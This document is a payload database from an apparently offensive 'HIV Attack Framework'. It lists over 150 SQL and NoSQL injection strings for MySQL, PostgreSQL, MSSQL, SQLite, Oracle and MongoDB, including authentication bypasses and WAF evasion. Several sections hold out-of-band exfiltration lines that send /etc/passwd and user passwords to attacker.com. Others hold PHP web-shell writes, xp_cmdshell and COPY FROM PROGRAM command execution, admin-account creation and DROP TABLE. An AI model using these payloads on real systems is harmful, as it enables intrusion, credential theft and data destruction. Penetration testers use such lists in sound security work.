# SQLi Payload Database — HIV Attack Framework

> 150+ functional SQL injection payloads for authorized security research.

---

## 1. MySQL Payloads

### 1.1 Boolean-Based Blind (MySQL)
```sql
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(version(),1,1)='8'--
' AND ASCII(SUBSTRING(database(),1,1))>64--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u'--
' AND LENGTH(database())>4--
' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')=1--
1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

### 1.2 Time-Based Blind (MySQL)
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(LENGTH(database())>4,SLEEP(5),0)--
' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5,SLEEP(5),0)--
1; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
' OR SLEEP(5)--
" OR SLEEP(5)--
1 AND SLEEP(5)
```

### 1.3 Error-Based (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,version()))--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND exp(~(SELECT * FROM(SELECT version())a))--
' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--
```

### 1.4 UNION-Based (MySQL)
```sql
' ORDER BY 1--
' ORDER BY 5--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' LIMIT 1--
' UNION SELECT 1,group_concat(username,':',password),3 FROM users--
' UNION SELECT 1,load_file('/etc/passwd'),3--
```

### 1.5 Stacked Queries (MySQL)
```sql
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','hacked123')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'hackpass'--
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--
```

### 1.6 OOB Exfiltration (MySQL)
```sql
' UNION SELECT load_file(concat('\\\\',version(),'.attacker.com\\share'))--
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e,'.attacker.com'))--
' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT "<?php system($_GET['c']);?>",2,3 INTO OUTFILE '/var/www/html/shell.php'--
-- DNS via UNC path (Windows MySQL):
'; SELECT load_file(concat('\\\\\\\\',database(),'.attacker.com\\\\x'))--
```

---

## 2. PostgreSQL Payloads

### 2.1 Boolean-Based Blind (PostgreSQL)
```sql
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(version(),1,1)='P'--
' AND (SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')>0--
' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END)='a'--
' AND ASCII(SUBSTRING((SELECT datname FROM pg_database LIMIT 1),1,1))>64--
```

### 2.2 Time-Based Blind (PostgreSQL)
```sql
'; SELECT pg_sleep(5)--
' AND (SELECT * FROM pg_sleep(5))--
' OR (SELECT * FROM pg_sleep(5))--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND 1=(SELECT 1 FROM pg_sleep(5))--
' UNION SELECT 1,pg_sleep(5),3--
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1)--
```

### 2.3 Error-Based (PostgreSQL)
```sql
' AND 1=CAST(version() AS INTEGER)--
' AND 1=CAST((SELECT current_database()) AS INTEGER)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)--
' UNION SELECT 1/0,2,3--
' AND (SELECT 1/CASE WHEN (1=1) THEN 0 ELSE 1 END)=1--
```

### 2.4 UNION-Based (PostgreSQL)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,version()--
' UNION SELECT 1,current_database()--
' UNION SELECT 1,current_user--
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1--
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1--
' UNION SELECT 1,string_agg(username||':'||password,',') FROM users--
```

### 2.5 Stacked Queries (PostgreSQL)
```sql
'; CREATE TABLE cmd_exec(cmd_output text)--
'; COPY cmd_exec FROM PROGRAM 'id'--
'; SELECT * FROM cmd_exec--
'; COPY (SELECT '') TO '/var/www/html/shell.php'--
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT--
'; SELECT system('id')--
```

### 2.6 OOB Exfiltration (PostgreSQL)
```sql
'; CREATE TABLE exfil(data text)--
'; COPY exfil FROM PROGRAM 'curl http://attacker.com/?d=$(cat /etc/passwd|base64)'--
'; SELECT dblink_connect('host=attacker.com user=postgres password=pass dbname=test')--
```

---

## 3. MSSQL Payloads

### 3.1 Time-Based Blind (MSSQL)
```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM sysobjects WHERE name='users')>0 WAITFOR DELAY '0:0:5'--
' AND IF(SUBSTRING(@@version,1,1)='M',WAITFOR DELAY '0:0:5',0)--
```

### 3.2 Error-Based (MSSQL)
```sql
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,db_name())--
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))--
```

### 3.3 UNION-Based (MSSQL)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,@@version--
' UNION SELECT 1,db_name()--
' UNION SELECT 1,system_user--
' UNION SELECT 1,table_name FROM information_schema.tables--
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username+':'+password FROM users--
```

### 3.4 Stacked / RCE (MSSQL)
```sql
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'powershell -enc <b64_payload>'--
'; EXEC sp_configure 'show advanced options',1--
'; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1--
'; RECONFIGURE--
'; EXEC xp_cmdshell 'net user hacker hackpass /add'--
'; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--
```

### 3.5 OOB Exfiltration (MSSQL)
```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; DECLARE @v varchar(max);SET @v=(SELECT TOP 1 name FROM sys.databases);EXEC('master..xp_dirtree ''\\'+@v+'.attacker.com\share''')--
'; EXEC master.dbo.xp_fileexist '\\attacker.com\share'--
```

---

## 4. SQLite Payloads

### 4.1 Boolean-Based (SQLite)
```sql
' AND 1=1--
' AND 1=2--
' AND SQLITE_VERSION() LIKE '3%'--
' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--
```

### 4.2 Time-Based (SQLite)
```sql
-- SQLite has no sleep(), use heavy query
' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master)>0--
' AND randomblob(100000000)>0--
```

### 4.3 UNION-Based (SQLite)
```sql
' UNION SELECT NULL--
' UNION SELECT 1,sqlite_version()--
' UNION SELECT 1,name FROM sqlite_master WHERE type='table' LIMIT 1--
' UNION SELECT 1,sql FROM sqlite_master WHERE type='table' LIMIT 1--
' UNION SELECT 1,group_concat(name) FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,username||':'||password FROM users LIMIT 1--
```

---

## 5. Oracle Payloads

### 5.1 Error-Based (Oracle)
```sql
' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT version FROM v$instance))--
' AND 1=UTL_INADDR.get_host_address((SELECT user FROM dual))--
' AND 1=dbms_utility.sqlid_to_sqlhash((SELECT user FROM dual))--
```

### 5.2 Time-Based (Oracle)
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' UNION SELECT 1,DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--
```

### 5.3 UNION-Based (Oracle)
```sql
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT 1,banner FROM v$version WHERE ROWNUM=1--
' UNION SELECT 1,user FROM dual--
' UNION SELECT 1,table_name FROM all_tables WHERE ROWNUM=1--
' UNION SELECT 1,column_name FROM all_columns WHERE table_name='USERS' AND ROWNUM=1--
' UNION SELECT 1,username||':'||password FROM users WHERE ROWNUM=1--
```

### 5.4 OOB (Oracle)
```sql
' UNION SELECT 1,UTL_HTTP.request('http://attacker.com/?d='||user) FROM dual--
' UNION SELECT 1,UTL_FILE.put_line(UTL_FILE.fopen('/tmp','x.txt','w'),(SELECT user FROM dual)) FROM dual--
' AND 1=UTL_INADDR.get_host_address(user||'.attacker.com')--
```

---

## 6. MongoDB (NoSQL) Payloads

### 6.1 Authentication Bypass
```javascript
// POST body (JSON)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": {"$in": ["admin", "administrator"]}, "password": {"$gt": ""}}

// URL parameters
?username[$ne]=invalid&password[$ne]=invalid
?username[$gt]=&password[$gt]=
?username[$regex]=.*&password[$regex]=.*
```

### 6.2 Data Extraction (MongoDB)
```javascript
// Blind extraction via $where
{"$where": "this.username == 'admin'"}
{"$where": "this.password.match(/^a/)"}
{"$where": "this.password.match(/^ab/)"}

// Using $regex for blind enumeration
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```

---

## 7. Authentication Bypass One-Liners (30+)

```sql
-- Classic bypasses
' OR 1=1--
' OR 1=1#
' OR 1=1/*
" OR 1=1--
" OR 1=1#
') OR 1=1--
") OR 1=1--
' OR 'x'='x
" OR "x"="x
') OR ('x'='x
") OR ("x"="x
' OR 1--
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1 LIMIT 1--
'admin'--
admin'--
admin' --
admin'#
admin'/*
' OR username LIKE 'admin%'--
'; exec xp_cmdshell('cmd')--

-- More exotic bypasses
1' AND '1'='1
1 AND 1=1
1 AND '1'='1'
1' OR '1'='1
admin') OR ('1'='1
' OR 1=1 AND ''='
' OR 'unusual'='unusual
' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--
'||(SELECT version())||'
' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--
```

---

## 8. WAF Bypass Variants

### MySQL WAF Bypass
```sql
-- Space alternatives
'/**/UNION/**/SELECT/**/NULL--
'%09UNION%09SELECT%09NULL--
'%0aUNION%0aSELECT%0aNULL--
'%0dUNION%0dSELECT%0dNULL--
'%0bUNION%0bSELECT%0bNULL--

-- Case variation
'UnIoN SeLeCt NuLl--
'UNION%20SELECT%20NULL--

-- Comment injection
'UN/**/ION SEL/**/ECT NULL--
'UNION/*!SELECT*/NULL--
'UNION /*!50000SELECT*/ NULL--

-- URL encoding
'%55NION %53ELECT NULL--
'UNION S%45LECT NULL--

-- HPP (HTTP Parameter Pollution)
?id=1&id=' UNION SELECT NULL--

-- Encoding tricks
'; SELECT CHAR(85,78,73,79,78)...--
```

---

## 9. Data Extraction Templates

### Extract Database Version
```sql
-- MySQL
' UNION SELECT 1,version(),3--
' AND extractvalue(1,concat(0x7e,version()))--

-- PostgreSQL
' UNION SELECT 1,version()--

-- MSSQL
' UNION SELECT 1,@@version--

-- Oracle
' UNION SELECT 1,banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT 1,sqlite_version()--
```

### Extract All Tables
```sql
-- MySQL
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--

-- PostgreSQL
' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public'--

-- MSSQL
' UNION SELECT 1,STRING_AGG(table_name,','),3 FROM information_schema.tables--

-- Oracle
' UNION SELECT 1,listagg(table_name,','),3 FROM all_tables--

-- SQLite
' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'--
```

### Extract Credentials
```sql
-- Generic (adjust table/column names)
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT 1,username,password FROM users LIMIT 1 OFFSET 0--
' UNION SELECT 1,username||':'||password,3 FROM users--  -- Oracle style
```

---

## 10. OOB Exfiltration (DNS + HTTP) per Database

### MySQL — DNS OOB
```sql
' UNION SELECT load_file(concat('\\\\\\\\', version(), '.attacker.com\\\\share'))--
' AND extractvalue(0x0a,concat(0x0a,(SELECT concat(username,0x3a,password) FROM users LIMIT 1),'.attacker.com'))--
```

### PostgreSQL — HTTP OOB
```sql
'; CREATE TABLE x(data text); COPY x FROM PROGRAM 'curl http://attacker.com/?d=$(cat /etc/passwd|base64 -w0)'; --
'; SELECT dblink('host=attacker.com user=x dbname=x','SELECT 1')--
```

### MSSQL — DNS OOB
```sql
'; DECLARE @q varchar(1024);SET @q='\\\\'+CONVERT(varchar(max),(SELECT TOP 1 password FROM users))+'.attacker.com\\x';EXEC xp_dirtree @q--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### Oracle — HTTP OOB
```sql
' UNION SELECT UTL_HTTP.request('http://attacker.com/?d='||UTL_ENCODE.base64_encode(UTL_RAW.cast_to_raw((SELECT password FROM users WHERE rownum=1)))) FROM dual--
' AND UTL_INADDR.get_host_address((SELECT password FROM users WHERE rownum=1)||'.attacker.com') IS NOT NULL--
```

---

*HIV Framework v2.0 — SQLi Payload Database | 150+ payloads | Authorized research only*
